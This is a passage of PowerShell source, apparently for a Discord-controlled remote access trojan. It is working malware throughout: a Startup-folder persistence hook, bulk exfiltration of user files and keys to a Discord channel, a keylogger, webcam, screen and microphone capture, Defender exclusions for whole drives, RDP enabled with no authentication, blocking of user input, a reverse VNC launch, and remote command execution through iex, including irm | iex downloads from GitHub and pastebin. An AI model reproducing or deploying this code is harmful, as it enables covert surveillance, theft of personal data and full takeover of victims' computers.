    sendMsg -Message ":white_check_mark: ``New Wallpaper Set`` :white_check_mark:"
}

Function Goose {
    $url = "https://github.com/beigeworm/assets/raw/main/Goose.zip"
    $tempFolder = $env:TMP
    $zipFile = Join-Path -Path $tempFolder -ChildPath "Goose.zip"
    $extractPath = Join-Path -Path $tempFolder -ChildPath "Goose"
    Invoke-WebRequest -Uri $url -OutFile $zipFile
    Expand-Archive -Path $zipFile -DestinationPath $extractPath
    $vbscript = "$extractPath\Goose.vbs"
    & $vbscript
    sendMsg -Message ":white_check_mark: ``Goose Spawned!`` :white_check_mark:"    
}

Function ScreenParty {
Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C Add-Type -AssemblyName System.Windows.Forms;`$d = 10;`$i = 100;`$1 = 'Black';`$2 = 'Green';`$3 = 'Red';`$4 = 'Yellow';`$5 = 'Blue';`$6 = 'white';`$st = Get-Date;while ((Get-Date) -lt `$st.AddSeconds(`$d)) {`$t = 1;while (`$t -lt 7){`$f = New-Object System.Windows.Forms.Form;`$f.BackColor = `$c;`$f.FormBorderStyle = 'None';`$f.WindowState = 'Maximized';`$f.TopMost = `$true;if (`$t -eq 1) {`$c = `$1}if (`$t -eq 2) {`$c = `$2}if (`$t -eq 3) {`$c = `$3}if (`$t -eq 4) {`$c = `$4}if (`$t -eq 5) {`$c = `$5}if (`$t -eq 6) {`$c = `$6}`$f.BackColor = `$c;`$f.Show();Start-Sleep -Milliseconds `$i;`$f.Close();`$t++}}")
    sendMsg -Message ":white_check_mark: ``Screen Party Started!`` :white_check_mark:"  
}

# --------------------------------------------------------------- PERSISTANCE FUNCTIONS ------------------------------------------------------------------------

Function AddPersistance{
    $newScriptPath = "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
    $scriptContent | Out-File -FilePath $newScriptPath -force
    sleep 1
    if ($newScriptPath.Length -lt 100){
        "`$tk = `"$token`"" | Out-File -FilePath $newScriptPath -Force -Append
        "`$ch = `"$chan`"" | Out-File -FilePath $newScriptPath -Force -Append
        i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
        sleep 1
        Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
        }
    $tobat = @'
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\Themes\copy.ps1""", 0, True
'@
    $pth = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
    $tobat | Out-File -FilePath $pth -Force
    rm -path "$env:TEMP\temp.ps1" -Force
    sendMsg -Message ":white_check_mark: ``Persistance Added!`` :white_check_mark:"
}

Function RemovePersistance{
    rm -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\service.vbs"
    rm -Path "$env:APPDATA\Microsoft\Windows\Themes\copy.ps1"
    sendMsg -Message ":octagonal_sign: ``Persistance Removed!`` :octagonal_sign:"
}

# --------------------------------------------------------------- USER FUNCTIONS ------------------------------------------------------------------------

Function Exfiltrate {
    param ([string[]]$FileType,[string[]]$Path)
    sendMsg -Message ":file_folder: ``Exfiltration Started..`` :file_folder:"
    $maxZipFileSize = 25MB
    $currentZipSize = 0
    $index = 1
    $zipFilePath ="$env:temp/Loot$index.zip"
    If($Path -ne $null){
        $foldersToSearch = "$env:USERPROFILE\"+$Path
    }else{
        $foldersToSearch = @("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")
    }
    If($FileType -ne $null){
        $fileExtensions = "*."+$FileType
    }else {
        $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
    }
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
    foreach ($folder in $foldersToSearch) {
        foreach ($extension in $fileExtensions) {
            $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
            foreach ($file in $files) {
                $fileSize = $file.Length
                if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                    $zipArchive.Dispose()
                    $currentZipSize = 0
                    sendFile -sendfilePath $zipFilePath | Out-Null
                    Sleep 1
                    Remove-Item -Path $zipFilePath -Force
                    $index++
                    $zipFilePath ="$env:temp/Loot$index.zip"
                    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                }
                $entryName = $file.FullName.Substring($folder.Length + 1)
                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                $currentZipSize += $fileSize
                PullMsg
                if ($response -like "kill") {
                    sendMsg -Message ":file_folder: ``Exfiltration Stopped`` :octagonal_sign:"
                    $script:previouscmd = $response
                    break
                }
            }
        }
    }
    $zipArchive.Dispose()
    sendFile -sendfilePath $zipFilePath | Out-Null
    sleep 5
    Remove-Item -Path $zipFilePath -Force
}

Function Upload{
param ([string[]]$Path)
    if (Test-Path -Path $path){
        $extension = [System.IO.Path]::GetExtension($path)
        if ($extension -eq ".exe" -or $extension -eq ".msi") {
            $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
            Add-Type -AssemblyName System.IO.Compression.FileSystem
            [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
            curl.exe -F file1=@"$tempZipFilePath" $hookurl | Out-Null
            sleep 1
            Rm -Path $tempZipFilePath -Recurse -Force
        }else{
            sendFile -sendfilePath $Path | Out-Null
        }
    }
}

Function SpeechToText {
    Add-Type -AssemblyName System.Speech
    $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine
    $grammar = New-Object System.Speech.Recognition.DictationGrammar
    $speech.LoadGrammar($grammar)
    $speech.SetInputToDefaultAudioDevice()
    
    while ($true) {
        $result = $speech.Recognize()
        if ($result) {
            $results = $result.Text
            Write-Output $results
            sendMsg -Message "``````$results``````"
        }
        PullMsg
        if ($response -like "kill") {
	$script:previouscmd = $response
        break
        }
    }
}

Function StartUvnc{
    param([string]$ip,[string]$port)

    sendMsg -Message ":arrows_counterclockwise: ``Starting UVNC Client..`` :arrows_counterclockwise:"
    $tempFolder = "$env:temp\vnc"
    $vncDownload = "https://github.com/beigeworm/assets/raw/main/winvnc.zip"
    $vncZip = "$tempFolder\winvnc.zip" 
    if (!(Test-Path -Path $tempFolder)) {
        New-Item -ItemType Directory -Path $tempFolder | Out-Null
    }  
    if (!(Test-Path -Path $vncZip)) {
        Iwr -Uri $vncDownload -OutFile $vncZip
    }
    sleep 1
    Expand-Archive -Path $vncZip -DestinationPath $tempFolder -Force
    sleep 1
    rm -Path $vncZip -Force  
    $proc = "$tempFolder\winvnc.exe"
    Start-Process $proc -ArgumentList ("-run")
    sleep 2
    Start-Process $proc -ArgumentList ("-connect $ip::$port")
    
}

Function TakePicture {
    $tempDir = "$env:temp"
    $imagePath = Join-Path -Path $tempDir -ChildPath "webcam_image.jpg"
    $Input = (Get-CimInstance Win32_PnPEntity | ? {$_.PNPClass -eq 'Camera'} | select -First 1).Name
    .$env:Temp\ffmpeg.exe -f dshow -i video="$Input" -frames:v 1 -y $imagePath
    sleep 1
    sendFile -sendfilePath $imagePath | Out-Null
    sleep 3
    Remove-Item -Path $imagePath -Force
}

Function Screenshot {
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)){  
        GetFfmpeg
    }
    sendMsg -Message ":arrows_counterclockwise: ``Taking a screenshot..`` :arrows_counterclockwise:"
    $mkvPath = "$env:Temp\ScreenClip.jpg"
    .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $mkvPath
    sleep 2
    sendFile -sendfilePath $mkvPath | Out-Null
    sleep 5
    rm -Path $mkvPath -Force
}

Function RecordAudio{
param ([int[]]$t)
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)){  
        GetFfmpeg
    }
    sleep 1
    sendMsg -Message ":arrows_counterclockwise: ``Recording audio for $t seconds..`` :arrows_counterclockwise:"
    Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
    function getFriendlyName($id) {$reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id";return (get-ItemProperty $reg).FriendlyName}
    $id1 = [audio]::GetDefault(1);$MicName = "$(getFriendlyName $id1)"; Write-Output $MicName
    $mp3Path = "$env:Temp\AudioClip.mp3"
    if ($t.Length -eq 0){$t = 10}
    .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $t -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $mp3Path
    sendFile -sendfilePath $mp3Path | Out-Null
    sleep 5
    rm -Path $mp3Path -Force
}

Function RecordScreen{
param ([int[]]$t)
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)){  
        GetFfmpeg
    }
    sendMsg -Message ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"
    $mkvPath = "$env:Temp\ScreenClip.mp4"
    if ($t.Length -eq 0){$t = 10}
    .$env:Temp\ffmpeg.exe -f gdigrab -framerate 10 -t 20 -i desktop -vcodec libx264 -preset fast -crf 18 -pix_fmt yuv420p -movflags +faststart $mkvPath
    # .$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath
    sendFile -sendfilePath $mkvPath | Out-Null
    sleep 5
    rm -Path $mkvPath -Force
}

Function KeyCapture {
    sendMsg -Message ":mag_right: ``Keylogger Started`` :mag_right:"
    $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
    $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
    $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
    $KeypressThreshold = [TimeSpan]::FromSeconds(10)
    While ($true){
        $keyPressed = $false
        try{
        while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
            Start-Sleep -Milliseconds 30
            for ($asc = 8; $asc -le 254; $asc++){
            $keyst = $API::GetAsyncKeyState($asc)
                if ($keyst -eq -32767) {
                $keyPressed = $true
                $LastKeypressTime.Restart()
                $null = [console]::CapsLock
                $vtkey = $API::MapVirtualKey($asc, 3)
                $kbst = New-Object Byte[] 256
                $checkkbst = $API::GetKeyboardState($kbst)
                $logchar = New-Object -TypeName System.Text.StringBuilder          
                    if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                    $LString = $logchar.ToString()
                        if ($asc -eq 8) {$LString = "[BKSP]"}
                        if ($asc -eq 13) {$LString = "[ENT]"}
                        if ($asc -eq 27) {$LString = "[ESC]"}
                        $nosave += $LString 
                        }
                    }
                }
            }
            PullMsg
            if ($response -like "kill") {
            sendMsg -Message ":mag_right: ``Keylogger Stopped`` :octagonal_sign:"
            $script:previouscmd = $response
	    $VBpath = "C:\Windows\Tasks\service.vbs"
            $tobat = @"
Set WshShell = WScript.CreateObject(`"WScript.Shell`")
WScript.Sleep 200
WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch='$chan'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
"@
            $tobat | Out-File -FilePath $VBpath -Force
            sleep 1
            & $VBpath
            exit
            }
        }
        finally{
            PullMsg
            If (($keyPressed) -and (!($response -like "kill"))) {
                $escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
                sendMsg -Message ":mag_right: ``Keys Captured :`` $escmsgsys"
                $keyPressed = $false
                $nosave = ""
            }
        }
    $LastKeypressTime.Restart()
    Start-Sleep -Milliseconds 10
    }
}

# --------------------------------------------------------------- ADMIN FUNCTIONS ------------------------------------------------------------------------

Function IsAdmin{
    If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
        sendMsg -Message ":octagonal_sign: ``Not Admin!`` :octagonal_sign:"
    }
    else{
        sendMsg -Message ":white_check_mark: ``You are Admin!`` :white_check_mark:"
    }
}

Function Elevate{
    $tobat = @"
Set WshShell = WScript.CreateObject(`"WScript.Shell`")
WScript.Sleep 200
If Not WScript.Arguments.Named.Exists(`"elevate`") Then
  CreateObject(`"Shell.Application`").ShellExecute WScript.FullName _
    , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
  WScript.Quit
End If
WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -C `$tk='$token'; `$ch='$chan'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
"@
    $pth = "C:\Windows\Tasks\service.vbs"
    $tobat | Out-File -FilePath $pth -Force
    try{
        & $pth
        Sleep 7
        rm -Path $pth
        sendMsg -Message ":white_check_mark: ``UAC Prompt sent to the current user..`` :white_check_mark:"
        exit
    }
    catch{
    Write-Host "FAILED"
    }
}

Function ExcludeCDrive {
    Add-MpPreference -ExclusionPath C:\
    sendMsg -Message ":white_check_mark: ``C:/ Drive Excluded`` :white_check_mark:"
}

Function ExcludeALLDrives {
    Add-MpPreference -ExclusionPath C:\
    Add-MpPreference -ExclusionPath D:\
    Add-MpPreference -ExclusionPath E:\
    Add-MpPreference -ExclusionPath F:\
    Add-MpPreference -ExclusionPath G:\
    sendMsg -Message ":white_check_mark: ``All Drives C:/ - G:/ Excluded`` :white_check_mark:"
}

Function EnableRDP {
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
    sendMsg -Message ":white_check_mark: ``RDP Enabled`` :white_check_mark:"
}

Function EnableIO{
    $signature = '[DllImport("user32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);'
    Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
    [Win32Functions.User32]::BlockInput($false)
    sendMsg -Message ":white_check_mark: ``IO Enabled`` :white_check_mark:"
}

Function DisableIO{
    $signature = '[DllImport("user32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);'
    Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
    [Win32Functions.User32]::BlockInput($true)
    sendMsg -Message ":octagonal_sign: ``IO Disabled`` :octagonal_sign:"
}

# =============================================================== MAIN FUNCTIONS =========================================================================

Function quickInfo{
Add-Type -AssemblyName System.Windows.Forms
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    $adminperm = "False"
} else {
    $adminperm = "True"
}
$systemInfo = Get-WmiObject -Class Win32_OperatingSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$processorInfo = Get-WmiObject -Class Win32_Processor
$computerSystemInfo = Get-WmiObject -Class Win32_ComputerSystem
$userInfo = Get-WmiObject -Class Win32_UserAccount
$videocardinfo = Get-WmiObject Win32_VideoController
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen;$Width = $Screen.Width;$Height = $Screen.Height;$screensize = "${width} x ${height}"
$email = (Get-ComputerInfo).WindowsRegisteredOwner
$OSString = "$($systemInfo.Caption)"
$OSArch = "$($systemInfo.OSArchitecture)"
$RamInfo = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
$processor = "$($processorInfo.Name)"
$gpu = "$($videocardinfo.Name)"
$ver = (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion
$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
$script:jsonPayload = @{
    username   = $env:COMPUTERNAME
    tts        = $false
    embeds     = @(
        @{
            title       = "$env:COMPUTERNAME | Computer Information "
            "description" = @"
``````SYSTEM INFORMATION FOR $env:COMPUTERNAME``````
:man_detective: **User Information** :man_detective:
- **Current User**          : ``$env:USERNAME``
- **Email Address**         : ``$email``
- **Language**              : ``$systemLanguage``
- **Administrator**         : ``$adminperm``

:minidisc: **OS Information** :minidisc:
- **Current OS**            : ``$OSString - $ver``
- **Architechture**         : ``$OSArch``

:globe_with_meridians: **Network Information** :globe_with_meridians:
- **Public IP Address**     : ``$computerPubIP``

:desktop: **Hardware Information** :desktop:
- **Processor**             : ``$processor`` 
- **Memory**                : ``$RamInfo``
- **Gpu**                   : ``$gpu``
- **Screen Size**           : ``$screensize``
"@
            color       = 65280
        }
    )
}
sendMsg -Embed $jsonPayload
}

Function WaitingMsg {
$script:jsonPayload = @{
    username   = $env:COMPUTERNAME
    tts        = $false
    embeds     = @(
        @{
            title       = ":hourglass: $env:COMPUTERNAME | Waiting to connect :hourglass:"
            "description" = @"
Enter **$env:COMPUTERNAME** in chat to start the session     
"@
            color       = 16776960
            footer      = @{
                text = "$timestamp"
            }
        }
    )
}
sendMsg -Embed $jsonPayload
}

Function CloseMsg {
$script:jsonPayload = @{
    username   = $env:COMPUTERNAME
    tts        = $false
    embeds     = @(
        @{
            title       = " $env:COMPUTERNAME | Session Closed "
            "description" = @"
:no_entry: **$env:COMPUTERNAME** Closing session :no_entry:     
"@
            color       = 16711680
            footer      = @{
                text = "$timestamp"
            }
        }
    )
}
sendMsg -Embed $jsonPayload
}

Function ConnectMsg {

if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
    $adminperm = "False"
} else {
    $adminperm = "True"
}

if ($InfoOnConnect -eq '1'){
    $infocall = ':hourglass: Getting system info - please wait.. :hourglass:'
}
else{
    $infocall = 'Type `` Options `` in chat for commands list'
}

$script:jsonPayload = @{
    username   = $env:COMPUTERNAME
    tts        = $false
    embeds     = @(
        @{
            title       = "$env:COMPUTERNAME | C2 session started!"
            "description" = @"
Session Started  : ``$timestamp``

$infocall
"@
            color       = 65280
        }
    )
}
sendMsg -Embed $jsonPayload

    if ($InfoOnConnect -eq '1'){
 	    quickInfo
  	    $dir = $PWD.Path
	    sendMsg -Message "``PS | $dir>``"
    }
    else{
        $dir = $PWD.Path
	    sendMsg -Message "``PS | $dir>``"
    }
}

function PullMsg {
    $headers = @{
        'Authorization' = "Bot $token"
    }
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", $headers.Authorization)
    $response = $webClient.DownloadString("https://discord.com/api/v9/channels/$chan/messages")
    if ($response) {
        $most_recent_message = ($response | ConvertFrom-Json)[0]
        if (-not $most_recent_message.author.bot) {
            $response = $most_recent_message.content
            $attachments = $most_recent_message.attachments
           if ($response -eq 'download' -and $attachments) {
                $attachment_url = $attachments[0].url
                $file_name = [System.IO.Path]::GetFileName($attachment_url)
                $file_name = $file_name.Split('?')[0]
                Write-Host "Downloading File : $file_name"
                $webClient.DownloadFile($attachment_url, $file_name)
            }
            $script:response = $response
            $script:messages = $response
        }
    } else {
        Write-Output "No messages found in the channel."
    }
}

function sendMsg {
    param(
        [string]$Message,
        [string]$Embed
    )

    $url = "https://discord.com/api/v9/channels/$chan/messages"
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", "Bot $token")
    $dir = $PWD.Path

    if ($Embed) {
        $jsonBody = $jsonPayload | ConvertTo-Json -Depth 10 -Compress
        $webClient.Headers.Add("Content-Type", "application/json")
        $response = $webClient.UploadString($url, "POST", $jsonBody)
        Write-Host "Embed sent to Discord"
        $jsonPayload = $null
    }
    if ($Message) {
            $jsonBody = @{
                "content" = "$Message"
                "username" = "$dir"
            } | ConvertTo-Json
            $webClient.Headers.Add("Content-Type", "application/json")
            $response = $webClient.UploadString($url, "POST", $jsonBody)
            Write-Host "Message sent to Discord"
	    $message = $null
    }
}


function sendFile {
    param(
        [string]$sendfilePath
    )

    $url = "https://discord.com/api/v9/channels/$chan/messages"
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", "Bot $token")
    if ($sendfilePath) {
        if (Test-Path $sendfilePath -PathType Leaf) {
            $response = $webClient.UploadFile($url, "POST", $sendfilePath)
            Write-Host "Attachment sent to Discord: $sendfilePath"
        } else {
            Write-Host "File not found: $sendfilePath"
            Send-Discord ('File not found: `' + $sendfilePath + '`')
        }
    }
}

Function GetFfmpeg{
    sendMsg -Message ":mag_right: ``Downloading FFmpeg to Client..`` :mag_right:"
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)){  
        $tempDir = "$env:temp"
        $apiUrl = "https://api.github.com/repos/GyanD/codexffmpeg/releases/latest"
        $wc = New-Object System.Net.WebClient           
        $wc.Headers.Add("User-Agent", "PowerShell")
        $response = $wc.DownloadString("$apiUrl")
        $release = $response | ConvertFrom-Json
        $asset = $release.assets | Where-Object { $_.name -like "*essentials_build.zip" }
        $zipUrl = $asset.browser_download_url
        $zipFilePath = Join-Path $tempDir $asset.name
        $extractedDir = Join-Path $tempDir ($asset.name -replace '.zip$', '')
        $wc.DownloadFile($zipUrl, $zipFilePath)
        Expand-Archive -Path $zipFilePath -DestinationPath $tempDir -Force
        Move-Item -Path (Join-Path $extractedDir 'bin\ffmpeg.exe') -Destination $tempDir -Force
        rm -Path $zipFilePath -Force
        rm -Path $extractedDir -Recurse -Force
    }
    sendMsg -Message ":white_check_mark: ``Download Complete`` :white_check_mark:"
}

Function HideConsole{
    If ($HideWindow -gt 0){
    $Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
    $Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
    $hwnd = (Get-Process -PID $pid).MainWindowHandle
        if($hwnd -ne [System.IntPtr]::Zero){
            $Type::ShowWindowAsync($hwnd, 0)
        }
        else{
            $Host.UI.RawUI.WindowTitle = 'hideme'
            $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
            $hwnd = $Proc.MainWindowHandle
            $Type::ShowWindowAsync($hwnd, 0)
        }
    }
}

Function VersionCheck {
    $versionCheck = irm -Uri "https://pastebin.com/raw/3axupAKL"
    $VBpath = "C:\Windows\Tasks\service.vbs"
    if (Test-Path "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"){
    Write-Output "Persistance Installed - Checking Version.."
        if (!($version -match $versionCheck)){
            Write-Output "Newer version available! Downloading and Restarting"
            RemovePersistance
            AddPersistance
            $tobat = @"
Set WshShell = WScript.CreateObject(`"WScript.Shell`")
WScript.Sleep 200
WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tk='$token'; `$ch='$chan'; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex`", 0, True
"@
            $tobat | Out-File -FilePath $VBpath -Force
            sleep 1
            & $VBpath
            exit
        }
    }
}

Function Authenticate{
    if (($response -like "$env:COMPUTERNAME") -or ($response -like "$env:COMPUTERNAME*") -or ($response -like "ControlAll")) {
        Write-Host "Authenticated $env:COMPUTERNAME"
        $script:authenticated = 1
        $script:previouscmd = $response
        if (($response -like "ControlAll") -or ($response -like "$env:COMPUTERNAME -nonew")){
            $spawnChannels = 0
        }
        if ($spawnChannels -eq 1){
            NewChannel
        }
        ConnectMsg
    }
    else{
        Write-Host "$env:COMPUTERNAME Not authenticated"
        $script:authenticated = 0
        $script:previouscmd = $response
    } 
}

Function getGuildID{

$headers = @{
    'Authorization' = "Bot $token"
}
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", $headers.Authorization)
    $response = $webClient.DownloadString("https://discord.com/api/v9/channels/$chan")
    $channel_info = $response | ConvertFrom-Json
    $script:gid = $channel_info.guild_id
}

Function NewChannel{
    $script:oldChan = $chan
    $uri = "https://discord.com/api/guilds/$gid/channels"
    $body = @{
        "name" = "session-$env:COMPUTERNAME"
        "type" = 0
    } | ConvertTo-Json
    
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("Authorization", "Bot $token")
    $webClient.Headers.Add("Content-Type", "application/json")
    $response = $webClient.UploadString($uri, "POST", $body)
    $responseObj = ConvertFrom-Json $response
    Write-Host "The ID of the new channel is: $($responseObj.id)"
    $script:chan = $responseObj.id
}
# =============================================================== MAIN LOOP =========================================================================

HideConsole
$connected = 0
while($connected -eq 0){
    try{
	PullMsg
        $previouscmd = $response
        VersionCheck
        GetGuildId
        WaitingMsg
 	sleep 1
        $connected = 1
    }
    catch{
    	sleep 5
    }
}

while($true){
    PullMsg
    if (!($response -like "$previouscmd")) {
        Write-Output "Command found!"
        if($authenticated -ne 1){
            if ($response -like "ShowAll") {
	    	$previouscmd = $response   
    		sendMsg -Message "``````Session Waiting : $env:COMPUTERNAME``````"
     	    }
     	}
        if($authenticated -eq 1){
            if ($response -like "close") {
                $previouscmd = $response        
                CloseMsg
                break
            }
            if ($response -like "Pause") {
                $script:authenticated = 0
                $previouscmd = $response
                $InfoOnConnect = 0
                $script:chan = $oldchan
                sendMsg -Message ":pause_button: ``Session Paused..`` :pause_button:"
                WaitingMsg
            }
	    if ($response -like "Download") {
                $previouscmd = $response
            }
            elseif (!($response -like "$previouscmd")) {
                $Result = ie`x($response) -ErrorAction Stop
                if (($result.length -eq 0) -or ($result -contains "public_flags") -or ($result -contains "                                           ")) {
                    $script:previouscmd = $response
                    sendMsg -Message ":white_check_mark:  ``Command Sent``  :white_check_mark:"
                    sleep -m 250
                    $dir = $PWD.Path
                    sendMsg -Message "``PS | $dir>``"
                }
                else {
                    $script:previouscmd = $response
                    $resultLines = $Result -split "`n"
                    $maxBatchSize = 1900
                    $currentBatchSize = 0
                    $batch = @()
                    foreach ($line in $resultLines) {
                        $lineSize = [System.Text.Encoding]::Unicode.GetByteCount($line)
                        if (($currentBatchSize + $lineSize) -gt $maxBatchSize) {
                            sendMsg -Message "``````$($batch -join "`n")``````"
                            sleep -m 400
                            $currentBatchSize = 0
                            $batch = @()
                        }
                        $batch += $line
                        $currentBatchSize += $lineSize
                    }
                    if ($batch.Count -gt 0) {
                        sendMsg -Message "``````$($batch -join "`n")``````"
                        sleep -m 250
                    }
                    $dir = $PWD.Path
                    sendMsg -Message "``PS | $dir>``"
                }
            }
        }
        else{
            Authenticate
        }
    }
    sleep 5
}
